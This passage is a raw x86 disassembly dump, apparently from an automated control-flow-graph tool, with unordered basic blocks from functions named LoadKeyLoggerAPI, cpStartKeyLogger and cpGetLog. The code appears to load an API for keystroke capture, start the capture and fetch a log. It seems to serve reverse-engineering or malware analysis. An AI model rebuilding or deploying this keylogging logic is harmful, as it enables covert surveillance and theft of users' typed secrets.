0x8055102:	call	dword ptr [0x805be2c]
None
|
|
|
v
0x805502f:	push	eax
0x8055030:	push	0x805671a
0x8055035:	jmp	0x8055055
None
|
|
|
v
0x8054fd6:	push	ecx
0x8054fd7:	push	0x80566c6
0x8054fdc:	jmp	0x8055055
None
|
|
|
v
0x8055071:	mov	dword ptr [esp + 0x15c], 0
0x805507c:	mov	dword ptr [esp + 0x160], 0
0x8055087:	push	ecx
0x8055088:	lea	eax, dword ptr [esp + 0x16c]
0x805508f:	push	eax
0x8055090:	lea	eax, dword ptr [esp + 0x168]
0x8055097:	push	eax
0x8055098:	push	edi
0x8055099:	call	dword ptr [0x805be68]
None
|
|
|
v
0x8054ec0:	ja	0x8054ee5
None
|
|
|
v
0x8054de4:	cmp	eax, 0xff0d
0x8054de9:	je	0x805503f
None
|
|
|
v
0x805500b:	push	0x20
0x805500d:	jmp	0x805505e
None
|
|
|
v
0x80551cf:	mov	dword ptr [0x8058730], 1
0x80551d9:	add	esp, 0x170
0x80551df:	pop	ebx
0x80551e0:	pop	esi
0x80551e1:	pop	edi
0x80551e2:	ret	
None
|
|
|
v
0x8054e74:	cmp	eax, 0xff58
0x8054e79:	je	0x8055017
None
|
|
|
v
0x8054f8c:	push	eax
0x8054f8d:	push	0x805669d
0x8054f92:	jmp	0x8055055
None
|
|
|
v
0x8054e8a:	jmp	0x8055047
None
|
|
|
v
0x8055005:	push	ecx
0x8055006:	push	0x80566ef
0x805500b:	push	0x20
0x805500d:	jmp	0x805505e
None
|
|
|
v
0x8054db3:	ja	0x8054e55
None
|
|
|
v
0x8054ea5:	cmp	eax, 0xff6b
0x8054eaa:	jne	0x80551d9
None
|
|
|
v
0x8054e28:	cmp	eax, 0xff50
0x8054e2d:	jne	0x80551d9
None
|
|
|
v
0x8054ddf:	jmp	0x8054f0b
None
|
|
|
v
0x8054f63:	push	esi
0x8054f64:	push	0x805666a
0x8054f69:	jmp	0x8055055
None
|
|
|
v
0x8054dd1:	ja	0x8054de4
None
|
|
|
v
0x805513b:	mov	dword ptr [esp + 0x160], 0
0x8055146:	mov	ebx, 0x80564c3
0x805514b:	mov	eax, dword ptr [esp + 0x160]
0x8055152:	cmp	dword ptr [0x8058734], eax
0x8055158:	je	0x80551bb
None
|
|
|
v
0x8054f0b:	test	byte ptr [ebx + 0x30], 4
0x8054f0f:	je	0x8054f3b
None
|
|
|
v
0x8054f4d:	push	eax
0x8054f4e:	push	0x8056651
0x8054f53:	jmp	0x8055055
None
|
|
|
v
0x8054fc4:	add	esp, 0x20
0x8054fc7:	mov	esi, eax
0x8054fc9:	jmp	0x8055069
None
|
|
|
v
0x805515a:	sub	esp, 0xc
0x805515d:	lea	edi, dword ptr [esp + 0x178]
0x8055164:	push	edi
0x8055165:	mov	dword ptr [0x8058734], eax
0x805516a:	call	0x804bbf0
None
|
|
|
v
0x8055037:	push	eax
0x8055038:	push	0x8056728
0x805503d:	jmp	0x8055055
None
|
|
|
v
0x8055017:	push	eax
0x8055018:	push	0x8056701
0x805501d:	jmp	0x8055055
None
|
|
|
v
0x8054da1:	mov	eax, dword ptr [esp + 0x150]
0x8054da8:	cmp	eax, 0xff57
0x8054dad:	je	0x805500f
None
|
|
|
v
0x80551cb:	test	eax, eax
0x80551cd:	jne	0x80551d9
None
|
|
|
v
0x80551d9:	add	esp, 0x170
0x80551df:	pop	ebx
0x80551e0:	pop	esi
0x80551e1:	pop	edi
0x80551e2:	ret	
None
|
|
|
v
0x8054ee3:	jmp	0x8054f4d
None
|
|
|
v
0x8054e5c:	cmp	eax, 0xffaa
0x8054e61:	jae	0x8054fa2
None
|
|
|
v
0x8054ee5:	cmp	eax, 0xffe9
0x8054eea:	jb	0x80551d9
None
|
|
|
v
0x80551ad:	add	esp, 0x40
0x80551b0:	xor	ecx, ecx
0x80551b2:	mov	edx, eax
0x80551b4:	mov	eax, esp
0x80551b6:	call	0x8054c98
None
|
|
|
v
0x8054fce:	push	ebx
0x8054fcf:	push	0x80566bb
0x8054fd4:	jmp	0x8055055
None
|
|
|
v
0x805503f:	push	eax
0x8055040:	push	0x805672e
0x8055045:	jmp	0x8055055
None
|
|
|
v
0x8055177:	push	dword ptr [eax]
0x8055179:	push	dword ptr [eax + 4]
0x805517c:	push	dword ptr [eax + 8]
0x805517f:	mov	edx, dword ptr [eax + 0x14]
0x8055182:	add	edx, 0x76c
0x8055188:	push	edx
0x8055189:	mov	edx, dword ptr [eax + 0x10]
0x805518c:	inc	edx
0x805518d:	push	edx
0x805518e:	push	dword ptr [eax + 0xc]
0x8055191:	push	ebx
0x8055192:	push	0x805674b
0x8055197:	push	0x100
0x805519c:	push	1
0x805519e:	push	0x100
0x80551a3:	lea	ebx, dword ptr [esp + 0x3c]
0x80551a7:	push	ebx
0x80551a8:	call	0x804bb70
None
|
|
|
v
0x8054db9:	cmp	eax, 0xff1b
0x8054dbe:	je	0x8055037
None
|
|
|
v
0x8054fb1:	push	0x20
0x8054fb3:	push	1
0x8054fb5:	push	0x20
0x8054fb7:	lea	eax, dword ptr [esp + 0x11c]
0x8054fbe:	push	eax
0x8054fbf:	call	0x804bb70
None
|
|
|
v
0x80550aa:	mov	eax, dword ptr [esp + 0x160]
0x80550b1:	cmp	dword ptr [0x8058734], eax
0x80550b7:	je	0x80551bb
None
|
|
|
v
0x8055108:	add	esp, 0x10
0x805510b:	push	eax
0x805510c:	mov	ebx, 0x80564c3
0x8055111:	lea	eax, dword ptr [esp + 0x144]
0x8055118:	push	eax
0x8055119:	push	dword ptr [esp + 0x15c]
0x8055120:	push	edi
0x8055121:	call	dword ptr [0x805be28]
None
|
|
|
v
0x8054efb:	cmp	eax, 0xffff
0x8054f00:	jne	0x80551d9
None
|
|
|
v
0x8054fed:	push	eax
0x8054fee:	push	0x80566d8
0x8054ff3:	jmp	0x8055055
None
|
|
|
v
0x8054eb5:	cmp	eax, 0xffe6
0x8054eba:	je	0x8054f58
None
|
|
|
v
0x8054e9a:	cmp	eax, 0xff8d
0x8054e9f:	je	0x8054fd6
None
|
|
|
v
0x8054e38:	cmp	eax, 0xff55
0x8054e3d:	je	0x8054ffd
None
|
|
|
v
0x8054ecd:	cmp	eax, 0xffe0
0x8054ed2:	jbe	0x8054fde
None
|
|
|
v
0x8054f11:	sub	eax, 0x30
0x8054f14:	cmp	eax, 9
0x8054f17:	ja	0x8054f26
None
|
|
|
v
0x8054e0a:	cmp	eax, 0xff53
0x8054e0f:	je	0x8054f79
None
|
|
|
v
0x8054f84:	push	edx
0x8054f85:	push	0x8056690
0x8054f8a:	jmp	0x805500b
None
|
|
|
v
0x8054dc6:	cmp	eax, 0xff08
0x8054dcb:	je	0x8054f8c
None
|
|
|
v
0x805500f:	push	edx
0x8055010:	push	0x80566fb
0x8055015:	jmp	0x8055055
None
|
|
|
v
0x8055139:	jmp	0x8055146
None
|
|
|
v
0x8054f58:	push	eax
0x8054f59:	push	0x805665d
0x8054f5e:	jmp	0x8055055
None
|
|
|
v
0x8055027:	push	eax
0x8055028:	push	0x8056711
0x805502d:	jmp	0x8055055
None
|
|
|
v
0x805505e:	push	eax
0x805505f:	call	0x804be40
None
|
|
|
v
0x8054fde:	push	edx
0x8054fdf:	sub	eax, 0xffbd
0x8054fe4:	push	edx
0x8054fe5:	push	eax
0x8054fe6:	push	0x80566d2
0x8054feb:	jmp	0x8054fb1
None
|
|
|
v
0x8054e17:	cmp	eax, 0xff51
0x8054e1c:	je	0x8054f63
None
|
|
|
v
0x80550ec:	add	esp, 0x20
0x80550ef:	test	eax, eax
0x80550f1:	je	0x805514b
None
|
|
|
v
0x805504f:	push	ebx
0x8055050:	push	0x8056745
0x8055055:	push	0x20
0x8055057:	lea	eax, dword ptr [esp + 0x10c]
0x805505e:	push	eax
0x805505f:	call	0x804be40
None
|
|
|
v
0x8055127:	add	esp, 0x10
0x805512a:	test	eax, eax
0x805512c:	je	0x805514b
None
|
|
|
v
0x8054f26:	push	eax
0x8054f27:	push	eax
0x8054f28:	movsx	eax, byte ptr [esp + 0x128]
0x8054f30:	add	eax, 0x40
0x8054f33:	push	eax
0x8054f34:	push	0x8056647
0x8054f39:	jmp	0x8054fb1
None
|
|
|
v
0x8054e8f:	cmp	eax, 0xff7f
0x8054e94:	je	0x8054fce
None
|
|
|
v
0x8054dd3:	lea	edx, dword ptr [eax - 0x20]
0x8054dd6:	cmp	edx, 0x5e
0x8054dd9:	ja	0x80551d9
None
|
|
|
v
0x8054dfa:	cmp	eax, 0xff09
0x8054dff:	jne	0x80551d9
None
|
|
|
v
0x8054e55:	cmp	eax, 0xffb9
0x8054e5a:	ja	0x8054eb5
None
|
|
|
v
0x8054e50:	jmp	0x8054f84
None
|
|
|
v
0x8054d92:	add	esp, 0x20
0x8054d95:	test	eax, eax
0x8054d97:	jle	0x8054da1
None
|
|
|
v
0x805516f:	mov	dword ptr [esp], edi
0x8055172:	call	0x804bdb0
None
|
|
|
v
0x8054fa2:	push	esi
0x8054fa3:	push	esi
0x8054fa4:	lea	eax, dword ptr [esp + 0x128]
0x8054fab:	push	eax
0x8054fac:	push	0x80566b2
0x8054fb1:	push	0x20
0x8054fb3:	push	1
0x8054fb5:	push	0x20
0x8054fb7:	lea	eax, dword ptr [esp + 0x11c]
0x8054fbe:	push	eax
0x8054fbf:	call	0x804bb70
None
|
|
|
v
0x80550f3:	mov	eax, dword ptr [esp + 0x15c]
0x80550fa:	test	eax, eax
0x80550fc:	je	0x805510b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:LoadKeyLoggerAPI
TOTAL BLOCKS :49
0x80552eb:	sub	esp, 0xc
0x80552ee:	push	0x1100
0x80552f3:	lea	ebx, dword ptr [esp + 0x1110]
0x80552fa:	push	ebx
0x80552fb:	push	0x8000
0x8055300:	push	0x80567a6
0x8055305:	push	0x80561b6
0x805530a:	call	0x804f39a
None
|
|
|
v
0x8055396:	push	eax
0x8055397:	push	eax
0x8055398:	push	0x80567d5
0x805539d:	push	ebx
0x805539e:	call	0x804f6a5
None
|
|
|
v
0x805535c:	sub	esp, 0xc
0x805535f:	lea	eax, dword ptr [esp + 0x110c]
0x8055366:	push	eax
0x8055367:	call	0x804f693
None
|
|
|
v
0x8055246:	add	esp, 0x20
0x8055249:	test	al, al
0x805524b:	je	0x80554e1
None
|
|
|
v
0x8055427:	push	eax
0x8055428:	push	eax
0x8055429:	push	0x8056814
0x805542e:	push	ebx
0x805542f:	call	0x804f6a5
None
|
|
|
v
0x80553a3:	add	esp, 0x10
0x80553a6:	test	eax, eax
0x80553a8:	mov	dword ptr [0x805be48], eax
0x80553ad:	je	0x80554e1
None
|
|
|
v
0x80552e0:	add	esp, 0x20
0x80552e3:	test	al, al
0x80552e5:	je	0x80554e1
None
|
|
|
v
0x80554b9:	add	esp, 0x10
0x80554bc:	test	eax, eax
0x80554be:	mov	dword ptr [0x805be5c], eax
0x80554c3:	je	0x80554e1
None
|
|
|
v
0x80553dd:	add	esp, 0x10
0x80553e0:	test	eax, eax
0x80553e2:	mov	dword ptr [0x805be30], eax
0x80553e7:	je	0x80554e1
None
|
|
|
v
0x80552c1:	sub	esp, 0xc
0x80552c4:	xor	esi, esi
0x80552c6:	push	0x1100
0x80552cb:	push	ebx
0x80552cc:	push	0x8000
0x80552d1:	push	0x8056781
0x80552d6:	push	0x80567b0
0x80552db:	call	0x804f39a
None
|
|
|
v
0x80554e1:	add	esp, 0x2200
0x80554e7:	mov	eax, esi
0x80554e9:	pop	ebx
0x80554ea:	pop	esi
0x80554eb:	pop	edi
0x80554ec:	ret	
None
|
|
|
v
0x8055461:	push	eax
0x8055462:	push	eax
0x8055463:	push	0x8056828
0x8055468:	push	edi
0x8055469:	call	0x804f6a5
None
|
|
|
v
0x8055220:	add	esp, 0x20
0x8055223:	test	al, al
0x8055225:	jne	0x8055251
None
|
|
|
v
0x805536c:	add	esp, 0x10
0x805536f:	test	eax, eax
0x8055371:	mov	edi, eax
0x8055373:	je	0x80554e1
None
|
|
|
v
0x80551e3:	push	edi
0x80551e4:	push	esi
0x80551e5:	push	ebx
0x80551e6:	sub	esp, 0x220c
0x80551ec:	push	0x8056776
0x80551f1:	call	0x804f141
None
|
|
|
v
0x8055275:	add	esp, 0x20
0x8055278:	test	al, al
0x805527a:	jne	0x8055340
None
|
|
|
v
0x805547a:	push	eax
0x805547b:	push	eax
0x805547c:	push	0x8056834
0x8055481:	push	edi
0x8055482:	call	0x804f6a5
None
|
|
|
v
0x8055434:	add	esp, 0x10
0x8055437:	test	eax, eax
0x8055439:	mov	dword ptr [0x805be2c], eax
0x805543e:	je	0x80554e1
None
|
|
|
v
0x8055280:	sub	esp, 0xc
0x8055283:	push	0x1100
0x8055288:	push	ebx
0x8055289:	push	0x8000
0x805528e:	push	0x80567a6
0x8055293:	push	0x805678c
0x8055298:	jmp	0x805532e
None
|
|
|
v
0x8055340:	sub	esp, 0xc
0x8055343:	xor	esi, esi
0x8055345:	lea	eax, dword ptr [esp + 0xc]
0x8055349:	push	eax
0x805534a:	call	0x804f693
None
|
|
|
v
0x805534f:	add	esp, 0x10
0x8055352:	test	eax, eax
0x8055354:	mov	ebx, eax
0x8055356:	je	0x80554e1
None
|
|
|
v
0x8055417:	add	esp, 0x10
0x805541a:	test	eax, eax
0x805541c:	mov	dword ptr [0x805be6c], eax
0x8055421:	je	0x80554e1
None
|
|
|
v
0x805532e:	call	0x804f39a
None
|
|
|
v
0x80553b3:	push	eax
0x80553b4:	push	eax
0x80553b5:	push	0x80567e0
0x80553ba:	push	ebx
0x80553bb:	call	0x804f6a5
None
|
|
|
v
0x80554ac:	push	ebx
0x80554ad:	push	ebx
0x80554ae:	push	0x8056859
0x80554b3:	push	edi
0x80554b4:	call	0x804f6a5
None
|
|
|
v
0x805540a:	push	eax
0x805540b:	push	eax
0x805540c:	push	0x8056806
0x8055411:	push	ebx
0x8055412:	call	0x804f6a5
None
|
|
|
v
0x8055203:	sub	esp, 0xc
0x8055206:	push	0x1100
0x805520b:	push	ebx
0x805520c:	push	0x8000
0x8055211:	push	0x8056781
0x8055216:	push	0x8056776
0x805521b:	call	0x804f39a
None
|
|
|
v
0x80554c5:	push	ecx
0x80554c6:	push	ecx
0x80554c7:	push	0x805686b
0x80554cc:	push	edi
0x80554cd:	call	0x804f6a5
None
|
|
|
v
0x8055379:	push	eax
0x805537a:	push	eax
0x805537b:	push	0x80567c8
0x8055380:	push	ebx
0x8055381:	call	0x804f6a5
None
|
|
|
v
0x8055487:	add	esp, 0x10
0x805548a:	test	eax, eax
0x805548c:	mov	dword ptr [0x805be38], eax
0x8055491:	je	0x80554e1
None
|
|
|
v
0x80553c0:	add	esp, 0x10
0x80553c3:	test	eax, eax
0x80553c5:	mov	dword ptr [0x805be28], eax
0x80553ca:	je	0x80554e1
None
|
|
|
v
0x805530f:	add	esp, 0x20
0x8055312:	test	al, al
0x8055314:	jne	0x8055340
None
|
|
|
v
0x8055316:	sub	esp, 0xc
0x8055319:	push	0x1100
0x805531e:	push	ebx
0x805531f:	push	0x8000
0x8055324:	push	0x80567a6
0x8055329:	push	0x80567b0
0x805532e:	call	0x804f39a
None
|
|
|
v
0x8055493:	push	eax
0x8055494:	push	eax
0x8055495:	push	0x805684a
0x805549a:	push	edi
0x805549b:	call	0x804f6a5
None
|
|
|
v
0x80552ba:	add	esp, 0x20
0x80552bd:	test	al, al
0x80552bf:	jne	0x80552eb
None
|
|
|
v
0x8055451:	add	esp, 0x10
0x8055454:	test	eax, eax
0x8055456:	mov	dword ptr [0x805be20], eax
0x805545b:	je	0x80554e1
None
|
|
|
v
0x80553ed:	push	edx
0x80553ee:	push	edx
0x80553ef:	push	0x80567f6
0x80553f4:	push	ebx
0x80553f5:	call	0x804f6a5
None
|
|
|
v
0x805529d:	sub	esp, 0xc
0x80552a0:	push	0x1100
0x80552a5:	push	ebx
0x80552a6:	push	0x8000
0x80552ab:	push	0x8056781
0x80552b0:	push	0x80561b6
0x80552b5:	call	0x804f39a
None
|
|
|
v
0x80551f6:	add	esp, 0x10
0x80551f9:	mov	ebx, esp
0x80551fb:	test	al, al
0x80551fd:	je	0x805529d
None
|
|
|
v
0x805546e:	add	esp, 0x10
0x8055471:	test	eax, eax
0x8055473:	mov	dword ptr [0x805be44], eax
0x8055478:	je	0x80554e1
None
|
|
|
v
0x80553d0:	push	ecx
0x80553d1:	push	ecx
0x80553d2:	push	0x80567eb
0x80553d7:	push	ebx
0x80553d8:	call	0x804f6a5
None
|
|
|
v
0x80554d2:	add	esp, 0x10
0x80554d5:	test	eax, eax
0x80554d7:	mov	dword ptr [0x805be40], eax
0x80554dc:	setne	al
0x80554df:	mov	esi, eax
0x80554e1:	add	esp, 0x2200
0x80554e7:	mov	eax, esi
0x80554e9:	pop	ebx
0x80554ea:	pop	esi
0x80554eb:	pop	edi
0x80554ec:	ret	
None
|
|
|
v
0x80554a0:	add	esp, 0x10
0x80554a3:	test	eax, eax
0x80554a5:	mov	dword ptr [0x805be68], eax
0x80554aa:	je	0x80554e1
None
|
|
|
v
0x8055444:	push	eax
0x8055445:	push	eax
0x8055446:	push	0x805681a
0x805544b:	push	ebx
0x805544c:	call	0x804f6a5
None
|
|
|
v
0x8055227:	sub	esp, 0xc
0x805522a:	xor	esi, esi
0x805522c:	push	0x1100
0x8055231:	push	ebx
0x8055232:	push	0x8000
0x8055237:	push	0x8056781
0x805523c:	push	0x805678c
0x8055241:	call	0x804f39a
None
|
|
|
v
0x8055333:	xor	esi, esi
0x8055335:	add	esp, 0x20
0x8055338:	test	al, al
0x805533a:	je	0x80554e1
None
|
|
|
v
0x80553fa:	add	esp, 0x10
0x80553fd:	test	eax, eax
0x80553ff:	mov	dword ptr [0x805be80], eax
0x8055404:	je	0x80554e1
None
|
|
|
v
0x8055386:	add	esp, 0x10
0x8055389:	test	eax, eax
0x805538b:	mov	dword ptr [0x805be34], eax
0x8055390:	je	0x80554e1
None
|
|
|
v
0x8055251:	sub	esp, 0xc
0x8055254:	push	0x1100
0x8055259:	lea	ebx, dword ptr [esp + 0x1110]
0x8055260:	push	ebx
0x8055261:	push	0x8000
0x8055266:	push	0x80567a6
0x805526b:	push	0x8056776
0x8055270:	call	0x804f39a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpStartKeyLogger
TOTAL BLOCKS :49
0x8055584:	add	esp, 0x10
0x8055587:	mov	edi, eax
0x8055589:	jmp	0x80555d6
None
|
|
|
v
0x8055611:	add	esp, 0x10
0x8055614:	test	eax, eax
0x8055616:	je	0x8055799
None
|
|
|
v
0x8055560:	mov	dword ptr [0x8058730], 3
0x805556a:	jmp	0x80557a3
None
|
|
|
v
0x80555df:	test	esi, esi
0x80555e1:	jne	0x80555f2
None
|
|
|
v
0x80556b1:	add	esp, 0x10
0x80556b4:	test	eax, eax
0x80556b6:	jne	0x8055799
None
|
|
|
v
0x80555d2:	inc	ebp
0x80555d3:	add	edi, 0x18
0x80555d6:	cmp	ebp, dword ptr [esp + 0xec]
0x80555dd:	jl	0x805558b
None
|
|
|
v
0x8055559:	add	esp, 0x20
0x805555c:	test	eax, eax
0x805555e:	jne	0x805556f
None
|
|
|
v
0x8055595:	mov	eax, dword ptr [esi]
0x8055597:	cmp	dword ptr [edi], eax
0x8055599:	jne	0x80555d2
None
|
|
|
v
0x805564f:	mov	dword ptr [esp + esi*4 + 0xc4], 0
0x805565a:	mov	ebp, edx
0x805565c:	xor	ecx, ecx
0x805565e:	mov	dword ptr [esp + 0xc], 0
0x8055666:	cmp	byte ptr [ebp], 0
0x805566a:	jne	0x805567e
None
|
|
|
v
0x805568f:	inc	esi
0x8055690:	inc	edi
0x8055691:	cmp	edi, dword ptr [esp + 0x1c]
0x8055695:	jl	0x8055645
None
|
|
|
v
0x8055791:	add	esp, 0x10
0x8055794:	jmp	0x80556d9
None
|
|
|
v
0x8055697:	push	esi
0x8055698:	lea	eax, dword ptr [esp + 0xc8]
0x805569f:	push	eax
0x80556a0:	push	dword ptr [esp + 0x20]
0x80556a4:	mov	dword ptr [0x805873c], ecx
0x80556aa:	push	ebx
0x80556ab:	call	dword ptr [0x805be38]
None
|
|
|
v
0x80555f2:	imul	eax, dword ptr [ebx + 0x84], 0x50
0x80555f9:	add	eax, dword ptr [ebx + 0x8c]
0x80555ff:	mov	eax, dword ptr [eax + 8]
0x8055602:	mov	dword ptr [esp + 0x18], eax
0x8055606:	push	edx
0x8055607:	push	edx
0x8055608:	push	dword ptr [esi]
0x805560a:	push	ebx
0x805560b:	call	dword ptr [0x805be44]
None
|
|
|
v
0x805559b:	jmp	0x80555e3
None
|
|
|
v
0x8055690:	inc	edi
0x8055691:	cmp	edi, dword ptr [esp + 0x1c]
0x8055695:	jl	0x8055645
None
|
|
|
v
0x80556d9:	push	eax
0x80556da:	push	eax
0x80556db:	push	edi
0x80556dc:	push	ebx
0x80556dd:	call	dword ptr [0x805be30]
None
|
|
|
v
0x8055523:	mov	dword ptr [0x8058730], 2
0x805552d:	jmp	0x80557ba
None
|
|
|
v
0x8055691:	cmp	edi, dword ptr [esp + 0x1c]
0x8055695:	jl	0x8055645
None
|
|
|
v
0x805561c:	mov	edx, dword ptr [eax + 4]
0x805561f:	test	edx, edx
0x8055621:	mov	dword ptr [esp + 0x10], edx
0x8055625:	jle	0x8055799
None
|
|
|
v
0x8055500:	mov	dword ptr [0x8058730], 6
0x805550a:	jmp	0x80557ba
None
|
|
|
v
0x80554ed:	push	ebp
0x80554ee:	push	edi
0x80554ef:	push	esi
0x80554f0:	push	ebx
0x80554f1:	sub	esp, 0xfc
0x80554f7:	call	0x80551e3
None
|
|
|
v
0x80557a3:	push	eax
0x80557a4:	push	eax
0x80557a5:	push	0
0x80557a7:	push	ebx
0x80557a8:	call	dword ptr [0x805be40]
None
|
|
|
v
0x80556bc:	test	esi, esi
0x80556be:	je	0x8055799
None
|
|
|
v
0x8055532:	sub	esp, 0xc
0x8055535:	lea	eax, dword ptr [esp + 0xf0]
0x805553c:	push	eax
0x805553d:	lea	eax, dword ptr [esp + 0xf0]
0x8055544:	push	eax
0x8055545:	lea	eax, dword ptr [esp + 0xfc]
0x805554c:	push	eax
0x805554d:	push	0x8056871
0x8055552:	push	ebx
0x8055553:	call	dword ptr [0x805be80]
None
|
|
|
v
0x805550f:	sub	esp, 0xc
0x8055512:	push	0
0x8055514:	call	dword ptr [0x805be34]
None
|
|
|
v
0x80557ba:	add	esp, 0xfc
0x80557c0:	pop	ebx
0x80557c1:	pop	esi
0x80557c2:	pop	edi
0x80557c3:	pop	ebp
0x80557c4:	ret	
None
|
|
|
v
0x80556f2:	mov	dword ptr [esp + 0x88], eax
0x80556f9:	mov	eax, dword ptr [esp + 0x2c]
0x80556fd:	mov	dword ptr [esp + 0x8c], eax
0x8055704:	mov	eax, dword ptr [esp + 0x34]
0x8055708:	mov	dword ptr [esp + 0x94], eax
0x805570f:	mov	eax, dword ptr [esp + 0x38]
0x8055713:	mov	dword ptr [esp + 0x98], eax
0x805571a:	mov	eax, dword ptr [esp + 0x40]
0x805571e:	mov	dword ptr [esp + 0x9c], eax
0x8055725:	mov	eax, dword ptr [esp + 0x44]
0x8055729:	mov	dword ptr [esp + 0xa0], eax
0x8055730:	mov	eax, dword ptr [esp + 0x48]
0x8055734:	mov	dword ptr [esp + 0xa4], eax
0x805573b:	mov	eax, dword ptr [esp + 0x4c]
0x805573f:	mov	dword ptr [esp + 0xa8], eax
0x8055746:	mov	eax, dword ptr [esp + 0x50]
0x805574a:	mov	dword ptr [esp + 0xac], eax
0x8055751:	mov	eax, dword ptr [esp + 0x54]
0x8055755:	mov	dword ptr [esp + 0xb0], eax
0x805575c:	mov	eax, dword ptr [esp + 0x58]
0x8055760:	mov	dword ptr [esp + 0xb4], eax
0x8055767:	mov	eax, dword ptr [esp + 0x5c]
0x805576b:	mov	dword ptr [esp + 0xb8], eax
0x8055772:	mov	eax, dword ptr [esp + 0x60]
0x8055776:	mov	dword ptr [esp + 0xbc], eax
0x805577d:	mov	eax, dword ptr [esp + 0x64]
0x8055781:	mov	dword ptr [esp + 0xc0], eax
0x8055788:	push	eax
0x8055789:	push	eax
0x805578a:	push	ebx
0x805578b:	push	esi
0x805578c:	call	0x8054d55
None
|
|
|
v
0x80557ae:	mov	dword ptr [esp], ebx
0x80557b1:	call	dword ptr [0x805be6c]
None
|
|
|
v
0x80556e3:	mov	eax, dword ptr [esp + 0x38]
0x80556e7:	add	esp, 0x10
0x80556ea:	cmp	eax, dword ptr [0x805873c]
0x80556f0:	jne	0x80556d9
None
|
|
|
v
0x805562b:	mov	esi, dword ptr [esi + 0xc]
0x805562e:	xor	edi, edi
0x8055630:	mov	edx, dword ptr [eax + 8]
0x8055633:	mov	ecx, dword ptr [0x805873c]
0x8055639:	mov	dword ptr [esp + 0x1c], esi
0x805563d:	xor	esi, esi
0x805563f:	mov	dword ptr [esp + 0x14], edx
0x8055643:	jmp	0x8055691
None
|
|
|
v
0x80555b1:	add	esp, 0x10
0x80555b4:	mov	edx, dword ptr [esp + 8]
0x80555b8:	test	eax, eax
0x80555ba:	jne	0x80555d0
None
|
|
|
v
0x8055645:	mov	edx, dword ptr [esp + 0x14]
0x8055649:	cmp	byte ptr [edx + edi*2], 0
0x805564d:	jne	0x8055690
None
|
|
|
v
0x805556f:	push	eax
0x8055570:	xor	ebp, ebp
0x8055572:	push	eax
0x8055573:	xor	esi, esi
0x8055575:	lea	eax, dword ptr [esp + 0xf4]
0x805557c:	push	eax
0x805557d:	push	ebx
0x805557e:	call	dword ptr [0x805be5c]
None
|
|
|
v
0x805551a:	add	esp, 0x10
0x805551d:	test	eax, eax
0x805551f:	mov	ebx, eax
0x8055521:	jne	0x8055532
None
|
|
|
v
0x80555d6:	cmp	ebp, dword ptr [esp + 0xec]
0x80555dd:	jl	0x805558b
None
|
|
|
v
0x80555bc:	push	ecx
0x80555bd:	push	ecx
0x80555be:	push	0x8056884
0x80555c3:	push	edx
0x80555c4:	call	0x804bb80
None
|
|
|
v
0x8055799:	mov	dword ptr [0x8058730], 5
0x80557a3:	push	eax
0x80557a4:	push	eax
0x80557a5:	push	0
0x80557a7:	push	ebx
0x80557a8:	call	dword ptr [0x805be40]
None
|
|
|
v
0x80556c4:	mov	dword ptr [0x8058730], 0
0x80556ce:	lea	edi, dword ptr [esp + 0x28]
0x80556d2:	lea	esi, dword ptr [esp + 0x88]
0x80556d9:	push	eax
0x80556da:	push	eax
0x80556db:	push	edi
0x80556dc:	push	ebx
0x80556dd:	call	dword ptr [0x805be30]
None
|
|
|
v
0x8055591:	test	esi, esi
0x8055593:	je	0x805559d
None
|
|
|
v
0x80555e3:	mov	dword ptr [0x8058730], 4
0x80555ed:	jmp	0x80557a3
None
|
|
|
v
0x80554fc:	test	al, al
0x80554fe:	jne	0x805550f
None
|
|
|
v
0x8055666:	cmp	byte ptr [ebp], 0
0x805566a:	jne	0x805567e
None
|
|
|
v
0x805559d:	mov	edx, dword ptr [edi + 8]
0x80555a0:	push	eax
0x80555a1:	push	eax
0x80555a2:	push	0x8056881
0x80555a7:	push	edx
0x80555a8:	mov	dword ptr [esp + 0x18], edx
0x80555ac:	call	0x804bb80
None
|
|
|
v
0x805567e:	inc	dword ptr [esp + 0xc]
0x8055682:	add	ebp, 2
0x8055685:	mov	edx, dword ptr [esp + 0x10]
0x8055689:	cmp	dword ptr [esp + 0xc], edx
0x805568d:	jne	0x8055666
None
|
|
|
v
0x80557b7:	add	esp, 0x10
0x80557ba:	add	esp, 0xfc
0x80557c0:	pop	ebx
0x80557c1:	pop	esi
0x80557c2:	pop	edi
0x80557c3:	pop	ebp
0x80557c4:	ret	
None
|
|
|
v
0x805566c:	mov	edx, dword ptr [eax]
0x805566e:	movzx	ecx, byte ptr [ebp + 1]
0x8055672:	shl	edx, 8
0x8055675:	or	edx, ecx
0x8055677:	mov	dword ptr [esp + esi*4 + 0xc4], edx
0x805567e:	inc	dword ptr [esp + 0xc]
0x8055682:	add	ebp, 2
0x8055685:	mov	edx, dword ptr [esp + 0x10]
0x8055689:	cmp	dword ptr [esp + 0xc], edx
0x805568d:	jne	0x8055666
None
|
|
|
v
0x80555d0:	mov	esi, edi
0x80555d2:	inc	ebp
0x80555d3:	add	edi, 0x18
0x80555d6:	cmp	ebp, dword ptr [esp + 0xec]
0x80555dd:	jl	0x805558b
None
|
|
|
v
0x805558b:	cmp	dword ptr [edi + 0x10], 1
0x805558f:	jle	0x80555d2
None
|
|
|
v
0x80555c9:	add	esp, 0x10
0x80555cc:	test	eax, eax
0x80555ce:	je	0x80555d2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetLog
TOTAL BLOCKS :10
0x8055802:	cmp	dword ptr [esp + 0xc], 0
0x8055807:	jle	0x8055879
None
|
|
|
v
0x8055809:	sub	esp, 0xc
0x805580c:	push	0x2024
0x8055811:	call	0x804bd40
None
|
|
|
v
0x8055885:	add	esp, 0x24
0x8055888:	pop	ebx
0x8055889:	pop	esi
0x805588a:	ret	
None
|
|
|
v
0x8055879:	push	0
0x805587b:	push	0
0x805587d:	push	0x37
0x805587f:	push	ebx
0x8055880:	call	0x804e62a
None
|
|
|
v
0x80557dd:	add	esp, 0x10
0x80557e0:	test	al, al
0x80557e2:	je	0x8055879
None
|
|
|
v
0x80557c5:	push	esi
0x80557c6:	push	ebx
0x80557c7:	sub	esp, 0x20
0x80557ca:	mov	ebx, dword ptr [esp + 0x2c]
0x80557ce:	mov	dword ptr [esp + 0x18], 0
0x80557d6:	push	0x40
0x80557d8:	call	0x8052879
None
|
|
|
v
0x80557e8:	push	esi
0x80557e9:	push	esi
